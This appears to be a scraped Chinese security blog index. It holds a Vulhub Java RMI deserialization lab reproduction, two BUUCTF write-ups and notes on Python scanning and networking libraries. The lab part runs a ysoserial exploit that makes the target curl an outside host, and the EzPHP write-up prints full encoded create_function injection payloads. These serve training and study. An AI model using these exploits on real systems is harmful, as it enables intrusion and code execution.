c9f14a7aef0fStep 5/12 : RUN cd /usr/src;     mvn -U clean package -Dmaven.test.skip=true --settings settings.xml ---&gt; Using cache ---&gt; 27cbdf63515cStep 6/12 : FROM openjdk:8u111-jre ---&gt; e44d62cf8862Step 7/12 : WORKDIR /root ---&gt; Using cache ---&gt; 313347366d80Step 8/12 : ENV RMIIP=\"127.0.0.1\" ---&gt; Using cache ---&gt; 90e0b68b0433Step 9/12 : COPY --from=builder /usr/src/target/train-1.0-SNAPSHOT-all.jar /root/train-1.0-SNAPSHOT-all.jar ---&gt; Using cache ---&gt; be0e1ec1469dStep 10/12 : COPY src/client.policy /root/ ---&gt; Using cache ---&gt; 9baa04a82cb7Step 11/12 : EXPOSE 1099 ---&gt; Using cache ---&gt; eb629a8ecc8aStep 12/12 : CMD [\"bash\", \"-c\", \"java -cp train-1.0-SNAPSHOT-all.jar -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.security.manager -Djava.security.policy=/root/client.policy train.rmi.Server\"] ---&gt; Using cache ---&gt; 77e422e51645Successfully built 77e422e51645Successfully tagged rmi-registry-bind-deserialization_rmi:latestroot@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose build/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.  from cryptography.hazmat.backends import default_backendBuilding rmiStep 1/12 : FROM maven:3-jdk-8 AS builder ---&gt; cf7c6bc6ea12Step 2/12 : LABEL MAINTAINER=\"phithon &lt;root@leavesongs.com&gt;\" ---&gt; Using cache ---&gt; 828f56e5b565Step 3/12 : COPY ./src/code/ /usr/src/ ---&gt; Using cache ---&gt; 004e82609029Step 4/12 : WORKDIR /usr/src ---&gt; Using cache ---&gt; c9f14a7aef0fStep 5/12 : RUN cd /usr/src;     mvn -U clean package -Dmaven.test.skip=true --settings settings.xml ---&gt; Using cache ---&gt; 27cbdf63515cStep 6/12 : FROM openjdk:8u111-jre ---&gt; e44d62cf8862Step 7/12 : WORKDIR /root ---&gt; Using cache ---&gt; 313347366d80Step 8/12 : ENV RMIIP=\"127.0.0.1\" ---&gt; Using cache ---&gt; 90e0b68b0433Step 9/12 : COPY --from=builder /usr/src/target/train-1.0-SNAPSHOT-all.jar /root/train-1.0-SNAPSHOT-all.jar ---&gt; Using cache ---&gt; be0e1ec1469dStep 10/12 : COPY src/client.policy /root/ ---&gt; Using cache ---&gt; 9baa04a82cb7Step 11/12 : EXPOSE 1099 ---&gt; Using cache ---&gt; eb629a8ecc8aStep 12/12 : CMD [\"bash\", \"-c\", \"java -cp train-1.0-SNAPSHOT-all.jar -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.security.manager -Djava.security.policy=/root/client.policy train.rmi.Server\"] ---&gt; Using cache ---&gt; 77e422e51645Successfully built 77e422e51645Successfully tagged rmi-registry-bind-deserialization_rmi:latest\n\nroot@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose run -e RMIIP=xx.xx.xx.xx -p 1099:1099 rmi/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.  from cryptography.hazmat.backends import default_backendCreating network \"rmi-registry-bind-deserialization_default\" with the default driverHello obj bound\n\n利用java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;\n\nF:\\Tools\\WEB\\Java-Tools&gt; java -cp ysoserial-master-8eb5cbfbf6-1.jar ysoserial.exploit.RMIRegistryExploit xx.xx.xx.xx 1099 CommonsCollections6 \"curl http://xx.xx.xx.xx:8000/exp\"java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:        java.rmi.AccessException: Registry.Registry.bind disallowed; origin /125.84.158.133 is non-local host        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:421)        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:272)        at sun.rmi.transport.Transport$1.run(Transport.java:200)        at sun.rmi.transport.Transport$1.run(Transport.java:197)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        at java.lang.Thread.run(Thread.java:745)        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:276)        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:253)        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:379)        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77)        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71)        at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)        at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71)        at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)Caused by: java.rmi.AccessException: Registry.Registry.bind disallowed; origin /125.84.158.133 is non-local host        at sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:287)        at sun.rmi.registry.RegistryImpl.bind(RegistryImpl.java:179)        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:411)        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:272)        at sun.rmi.transport.Transport$1.run(Transport.java:200)        at sun.rmi.transport.Transport$1.run(Transport.java:197)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:683)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        at java.lang.Thread.run(Thread.java:745)\n\n成功执行\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...121.4.65.44 - - [06/Nov/2021 14:20:15] code 404, message File not found121.4.65.44 - - [06/Nov/2021 14:20:15] &quot;GET /exp HTTP/1.1&quot; 404 -\n\n小结本来是想多复现几个场景的，但是由于环境原因，实现起来比较复杂，我的目的就只是练习使用ysoserial工具，就懒得搞了，而且耽误时间并且意义也不大，那么学习java反序列就告一段落，这只是刚刚开始，后边还会陆陆续续进行学习。\n","categories":["Java安全"],"tags":["java安全漫谈","java安全"]},{"title":"BUUCTF-WEB 【BSidesCF 2019】Cookie 1","url":"/2021/08/24/%5BBSidesCF%202019%5DCookie%201/","content":"考点：Cookie伪造打开\n两个提示信息\n Log in as admin!We found the account cookie / monster\n\n我以为多难，就只是伪造一下cookie。刚开始测试了sql注入，没反应。又用dirsearch扫了目录，翻了源代码。\n这里提到了cookie，伪造Cookie，直接回显了flag。\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","Cookie伪造"]},{"title":"BUUCTF-WEB [BJDCTF2020]EzPHP 1","url":"/2021/10/20/%5BBJDCTF2020%5DEzPHP%201/","content":"考点&amp;知识点代码审计\n解题过程分析\n打开是这个样，不能右键看源代码，通过view-source:的方式查看\n\n得到一串类似于base64的字符串\nGFXEIM3YFZYGQ4A=\n\n猜测是base32,解码得到\n1nD3x.php\n\n访问得到 \n &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = \"1nD3x.php\";$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo \"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;\";if($_SERVER) &#123;     if (        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])        )          die('You seem to want to do something bad?'); &#125;if (!preg_match('/http|https/i', $_GET['file'])) &#123;    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123;         $file = $_GET[\"file\"];         echo \"Neeeeee! Good Job!&lt;br&gt;\";    &#125; &#125; else die('fxck you! What do you want to do ?!');if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match('/[a-zA-Z]/i', $value))              die('fxck you! I hate English!');     &#125; &#125; if (file_get_contents($file) !== 'debu_debu_aqua')    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\");if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[\"flag\"]);    echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123;    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125;if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123;     die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123;     include \"flag.php\";    $code('', $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn't it ?\n\n代码审计这需要绕过的条件比较多，我单独分开列出来。\nif (        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])        )\n\n第一个条件就过滤了需要用到的关键字，这个正则匹配的是$_SERVER[&#39;QUERY_STRING&#39;]里的内容，这个数组变量的值保存的是查询的字符串?query=1&amp;，也就是?后面的字符串。\n对参数进行url编码后，拿到的也是编码后的内容，这个正则我们可以通过url编码绕过。\nif (!preg_match('/http|https/i', $_GET['file'])) &#123;    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123;         $file = $_GET[\"file\"];         echo \"Neeeeee! Good Job!&lt;br&gt;\";    &#125;\n\n这里有两个条件，第一个条件过滤了http和https关键字。下面的就是正则字符匹配的双标操作，既要等于这个字符串又不能是这个字符串，遇到/^aqua_is_cute$/，可以在末尾加上%0a，%0a就是换行，就可以绕过。\nif($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match('/[a-zA-Z]/i', $value))              die('fxck you! I hate English!');     &#125; &#125;\n\n这个正则就有点狠，直接对$_REQUEST数组进行变量，把该数组中所有的属性值都进行正则匹配，不能有字母。以我的思路，到这就做不动了，还是看师傅们的wp，当我们同时提交get和post请求时，这个foreach是以post请求优先进行遍历。此时的$_REQUEST就是post传入的内容，所以这里同时传入file和debu参数即可绕过。(这个如果post跟get请求都有file参数，那么就只会遍历post的file参数)\nif (file_get_contents($file) !== 'debu_debu_aqua')    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\");\n\n只要绕过了前面几个条件，这个还是比较容易，不能使用http、https，这里可以使用data协议。\ndata://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=\n\nif ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[\"flag\"]);    echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123;    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125;\n\n老知识点了，sha1加密的双标操作，数组绕过即可。绕过后，会执行extract函数，这个函数可以进行进行变量覆盖，这里我们需要覆盖的是$code和$arg。\nflag[code]=覆盖$code变量的值flag[arg]=覆盖$arg变量的值\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123;     die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123;     include \"flag.php\";    $code('', $arg); &#125;\n\n接下来，最后一个条件，也是利用点,$code(&#39;&#39;, $arg);,这里可以使用create_function函数，这里有个下划线，正则匹配的是只能是数字和字母，并且以数字字母开头结尾，直接绕过，create_function函数的利用方式另一篇有讲。另一个条件，可以看到过滤了很多关键字，但是没有过滤var_dump和get_defined_vars函数，这里通过var_dump和get_defined_vars输出全部变量的值。\n最终构建的payload\ndebu=aqua_is_cute%0a&amp;file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&amp;shana[]=a&amp;passwd[]=b&amp;flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//\n\n但是要进行rul编码\nget\n1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%73%68%61%6e%61[]=a&amp;%70%61%73%73%77%64[]=b&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;var_dump(get_defined_vars());//\n\npost\nfile=1&amp;debu=2\n\n回显\n\n再次读取\n注意：这里使用system函数执行命令，是没有回显的。\n这里使用require函数用php://filter协议进行读取\npayload\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)\n\n当然，这里面有很多关键字被过滤掉了，这里对内容进行取反进行url编码得到得到\n%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F\n\nrequire(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))\n\n再次提交\nget\n1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%73%68%61%6e%61[]=a&amp;%70%61%73%73%77%64[]=b&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n\npost\nfile=1&amp;debu=2\n\n\nPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNlci1zY2FsYWJsZT1ubyI+DQo8dGl0bGU+UmVhbF9GbGFnIEluIEhlcmUhISE8L3RpdGxlPg0KPC9oZWFkPg0KPC9odG1sPg0KPD9waHANCgllY2hvICLlkqbvvIzkvaDlsYXnhLbmib7liLDmiJHkuobvvJ/vvIHkuI3ov4fnnIvliLDov5nlj6Xor53kuZ/kuI3ku6PooajkvaDlsLHog73mi7/liLBmbGFn5ZOm77yBIjsNCgkkZjRrZV9mbGFnID0gIkJKRHsxYW1fYV9mYWtlX2Y0MTExMWcyMzMzM30iOw0KCSRyZWExX2YxMTE0ZyA9ICJmbGFnezFhNDM5N2MwLWI5ODctNGU4Mi04NjY3LTJiOGRiNDkyOGJiMn0iOw0KCXVuc2V0KCRyZWExX2YxMTE0Zyk7DQo=\n\n&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;&lt;/head&gt;&lt;/html&gt;&lt;?php\techo &quot;å¦ï¼ä½ å±ç¶æ¾å°æäºï¼ï¼ä¸è¿çå°è¿å¥è¯ä¹ä¸ä»£è¡¨ä½ å°±è½æ¿å°flagå¦ï¼&quot;;\t$f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;\t$rea1_f1114g = &quot;flag&#123;1a4397c0-b987-4e82-8667-2b8db4928bb2&#125;&quot;;\tunset($rea1_f1114g);\n\n完成\n总结比较喜欢做这类题目，像闯关一样，不仅能学到很多新知识点，还能一步步调试，分析程序执行过程。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF"]},{"title":"Python库学习","url":"/2021/12/31/Python%E5%BA%93%E5%AD%A6%E4%B9%A0/","content":"前言\n说明：所有库(除开os、time、sys标准库)，按照案例实现的方式，对重要代码进行了总结，方便之后进行复习。\n\n\n数据包制作/网络通信/扫描相关模块包含了socket、scapy、nmap库\n\n应用程序服务相关模块包含了paramiko、ftplib、pymysql库\n\n网络请求模块包含了urllib、urllib2、request库\n\n进程/多线程/多进程/队列相关模块包含了subprocess、threading、multiprocessing、queue库\n\n命令行解析有argparse库\n\n编码解码包含了base64、hashlib库\n\n常用标准库包含了time、random、re、sys、os库\n\n\n据包制作/网络通信/扫描相关模块socket功能： socket实现简单服务端客户端通信(C/S)服务端\n# 0x01创建socket对象（AF_INET=IPv4，SOCK_STREAM=流式socket，for TCP）sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 0x02为socket绑定IP端口sk.bind(('主机地址', 端口))# 0x03设置监听sk.listen(5)# 0x04设置堵塞(返回一个通信对象conn 和 一个连接地址 address)conn,address = sk.accept()# 0x05数据交互发送数据conn.send()  # 发送数据 返回值为发送数据字节数量conn.sendall() # 完整发送数据，返回之前会尝试发送所有数据，成功返回None，失败则抛出异常# 接收数据conn.recv(bufsize) # bufsize为接收大小 # 0x06关闭连接sk.close()\n\n客户端\n# 0x01 创建socket对象sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 0x02连接sk.connect(('主机地址', 端口))# 0x03数据交互发送数据conn.send() #发送数据 返回值为发送数据字节数量conn.sendall() #完整发送数据，返回之前会尝试发送所有数据，成功返回None，失败则抛出异常接收数据conn.recv(bufsize) # bufsize为接收大小# 0x04关闭sk.close()\n\nscapy功能：scapy实现主机发现功能# 1. 构造arp数据包arp = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='IP段')# 2. 发送数据包(res 保存探测结果 unres 保存未答复的)（srp 二层发包 具有接收功能）res,unres = srp(arp, timeout=2)# 3. 显示结果（res保存着存活主机的结果集，s是res中的一个头部 ，h也是res中的一个头部，只不过，很多信息保存在h头部里。  h.hwsc 代表目的MAC地址，h.psrc代表目的的IP地址。）for s,h in res:    print(\"MAC：\"+h.hwsrc+\"  \"+\"IP：\"+h.psrc)\n\n功能：scapy实现TCP全连接端口扫描# 1. 构造tcp端口扫描数据包tcp = IP(dst='目的IP')/TCP(dport=端口号, flags=\"S\")# 2. 发送数据包(sr1 在三层发送数据包 有接收功能 只接收一个)res = sr1(tcp,  timeout=2)# 3 . 判断 接收数据包的TCP头部的flags 含有 SA(端口打开) 或 RA(端口关闭)if res['TCP'].flags == 'SA'   或者 ifres['TCP'].flags =='RA'# 4 . 继续发送数据包 继续完成三次握手 (如果上一步为RA 则直接输出当前端口关闭)res = sr1(IP(dst='目的IP')/TCP(dport=端口号, flags=\"AR\"), timeout=2)\n\n功能：scapy实现ICMP探测主机存活# 1 . 构造icmp数据包icmp = IP(dst='目的IP', id=100)/ICMP(seq=100, id=100)/b'hello'# 2 . 发送数据包res = sr1(icmp, timeout=2)# 3 . 判断主机存活和输出结果判断if res:    # 输出结果    # 输出地址     res['IP'].src         # 输出ttl值     res.['IP'].ttl\n\n功能：scapy实现syn半开方式扫描（与TCP扫描区别在于继续发送数据包中的flags 为 R）# 1. 构造syn端口扫描数据包syn = IP(dst='目的IP')/TCP(dport=端口号, flags=\"S\")# 2. 发送数据包(sr1 在三层发送数据包 有接收功能 只接收一个)res = sr1(syn,  timeout=2)# 3 . 判断 接收数据包的TCP头部的flags 含有 SA(端口打开) 或 RA(端口关闭)if res['TCP'].flags == 'SA'   或者 ifres['TCP'].flags =='RA'# 4 . 继续发送数据包 完成完成三次握手 (如果上一步为RA 则直接输出当前端口关闭)res = sr1(IP(dst='目的IP')/TCP(dport=端口号, flags=\"R\"), timeout=2)\n\nnmapnmap 扫描参数\n主机发现\n-sP  -sn -sA\n\n端口扫描\n-sS -sT -sU\n\n检测应用程序版本和操作系统信息\n-sV(应用程序版本) -O(操作系统信息)\n\n脚本使用\n--script=vuln(扫描主机是否存在常见漏洞)\n\n功能：nmap实现端口扫描和结果输出（输出 PORT STATE SERVICE VERSION ）# 1 . 创建对象nm = nmap.PortScanner()# 2 . 填写参数执行扫描(根据参数自定义)nm.scan(hosts='IP/IP段', arguments='-sV -p0-65535') # 3 . 显示结果（返回的对象可以用以下方法进行处理）\n\nPortScanner()类方法\n示例\nnm.command_line()\n1. command_line() 返回扫描方法\n2. scaninfo() 返回nmap扫描信息\n3. all_hosts() 返回nmap扫描的主机清单PortScannerHostDict()类方法\n示例\nnm[‘ip’].hostname()\n\nhostname()         返回扫描对象主机名\nstate( )                 返回扫描对象状态\nall_protocols()    返回扫描的协议\nall_tcp()               返回tcp协议扫描的端口\ntcp(port)             返回扫描tcp协议port端口的信息\nall_udp()             返回udp协议扫描的端口\nudp(port)          返回扫描udp协议port端口的信息\n\n应用程序服务相关模块paramikoSSHClient() 类\n功能：paramiko库的SSHClient实现ssh连接和执行命令并回显结果# 1.  创建ssh对象client = paramiko.SSHClient()# 2 . 设置远程服务器应对策略client.set_missing_host_key_policy(paramiko.AutoAddPolicy())# 3 . 设置参数进行连接client.connect(hostname='主机地址' , port='主机端口', username='主机用户名', password='主机密码')# 4 . 执行命令stdin,stdout,stderr = clinet.exec_command('netstat -lnt')stdout 为正确输出 stderr 为错误输出 两者同时只有一个变量有值# 5 . 输出结果输出# 正确结果if stdout:        print(stdout.read().decode('utf-8'))# 输出错误结果if stderr:        print(stderr.read().decode('utf-8'))\n\n功能：SSHClient封装Transport方式实现ssh连接# 1 . 创建一个通道transport = paramiko.Transport(('主机地址', 端口号))transport.connect(username='主机用户名', password='主机密码')# 2 . 创建SSHClient对象ssh = paramiko.SSHClient()ssh._transport = transport# 3 . 执行命令stdin,stdout,stderr = ssh.exec_command('netstat -lnt')# 4 . 输出结果# 输出正确结果if stdout:        print(stdout.read().decode('utf-8'))# 输出错误结果 if stderr:        print(stderr.read().decode('utf-8'))\n\nSFTPClient() 类功能：SFTPClient封装Transport方式实现文件上传与下载# 1 . 创建通道tran = paramiko.Transport(('主机地址', 端口号))tran.connect(username='主机名', password='主机密码')# 2 . 创建SFTP对象sftp = paramiko.SFTPClient.from_transport(tran)# 3 . 设置路径localpath = '本地文件路径'remotepath = '远程文件路径'# 4 . 执行上传sftp.put(localpath, remotepath)# 5 . 执行下载stfp.get(remorepath, localpath)\n\n常用方法\nmkdir()       在服务上创建目录\nremove()    在服务器上删除目录\nrename()    在服务器上重命名目录\nstat()          查看服务器文件目录\nlistdir()        列出服务器目录下的文件 \nftplib功能：实现上传本地文件到ftp服务器# 创建对象ftp = ftplib.FTP()# 配置连接# 设置调试级别，显示详细信息ftp.set_debuglevel(2)# 连接ftp serverftp.connect('主机地址', '端口号')# 登录ftp.login('ftp用户名', '密码')# 输出欢迎信息print(ftp.getwelcome())# 执行操作# 设置缓冲区大小bufsize = 1024# 设置本地路径localpath = '本地文件路径'# 设置远程文件路径remotepath =  '远程文件路径'# 打开本地路径文件file = open(filename, 'rb')# 上传文件ftp.storbinary(\"STOR\"+remotepath, remotepath, bufsize)# 关闭调试信息ftp.set_debuglevel(0)# 关闭文件ftp.quit()\n\n功能：实现从ftp服务器下载文件到本地# 创建对象ftp = ftplib.FTP()# 配置连接# 设置调试级别，显示详细信息ftp.set_debuglevel(2)# 连接ftp serverftp.connect('主机地址', '端口号')# 登录ftp.login('ftp用户名', '密码')# 输出欢迎信息print(ftp.getwelcome())# 执行操作# 设置缓冲区大小bufsize = 1024# 设置本地路径localpath = '本地文件路径'# 设置远程文件路径remopepath = '远程文件路径'# 打开本地文件路径file = open(localpath, 'wb').write# 下载文件ftp.retrbinary(\"RETR\"+remopepathf, file, bufsize)# 关闭调试信息ftp.set_debuflevel(0)# 关闭文件ftp.quit()\n\n 相关方法\n\nftp.dir()              显示目录下所有目录信息\n\nftp.nlst()                    获取目录下的文件\n\nftp.pwd()                     返回当前所在位置\n\nftp.cwd(pathname)       设置FTP当前操作路径   \n\nftp.mkd(pathname)      新建远程目录\n\nftp.rmd(dirname)         删除远程目录\n\nftp.delete(filename)     删除远程文件\n\nftp.rename(fromname, toname)       将fromname 修改名称为 toname\n\n\nMySQLdb(只支持到py3.4)、pymysql(支持py3.5+)\n（查阅资料后 两个库基本方法均一致 用pymyql演示）\n\n功能：实现数据库连接后进行增删改查# 创建连接conn = pymysql.connect('主机地址', 'mysql用户名', '密码', '数据库')# 创建游标cur = conn.cursor()# 执行sqlcur.execute(sql语句)# 输出结果data = cur.fetchone()   # 输出一条结果data = cur.fetchall()   # 输出所有结果# 关闭游标cur.close()# 关闭连接conn.close()\n\n功能：pymysql实现数据库DML操作# 创建连接conn = pymysql.connect('主机地址', 'myql用户名', '密码', '数据库')# 创建游标cur = conn.cursor()# 执行sqlcur.execute(\"update 表名 set 字段名='新值' where 条件 \")# 关闭游标cur.close()# 执行DML语句 保存方法cur.commit()# 关闭连接conn.close()\n\n相关SQL语句：\n增：\n增加表\ncreate table 表名 (字段名 字段类型 其他, 字段名 字段类型 其他, ...);\n\n增加字段\nalter table 表名 add 字段 类型 其他;\n\n删：\n删除表\ndrop table 表名\n\n删除表中数据\ndelete from 表名 where 表达式\n\n改：\n改表名\nrename table 原表名 to 新表名;\n\n改字段\nupdate 表名 set 字段=新值 where 条件\n\n网络请求模块功能：python2下 urllib+urllib2 进行POST提交数据（dvwa xss 提交数据为例）# 设置提交urlurl = 'http://127.0.0.1/DVWA/vulnerabilities/xss_s/'# 设置请求头部headers = &#123;'cookie': 'cookie值'&#125;# POST提交data 参数data = &#123;'txtName': '标题', 'mtxMessage': '内容', 'btnSign': 'Sign Guestbook'&#125;# data 进行url编码data = urllib.urlencode(data)# 构建Request 对象request = urllib2.Request(url, data, headers)# 请求urlopen() 只接收url, data, timeout 三个参数resp = urllib2.urlopen(request)# 输出结果print(resp.read())\n\n功能：python2 下用 urllib2 + re 实现对dvwa（xss）评论内容爬取# 设置爬取的urlurl = \"http://127.0.0.1/DVWA/vulnerabilities/xss_s/\"# 设置头部headers = &#123;'User-Agent': 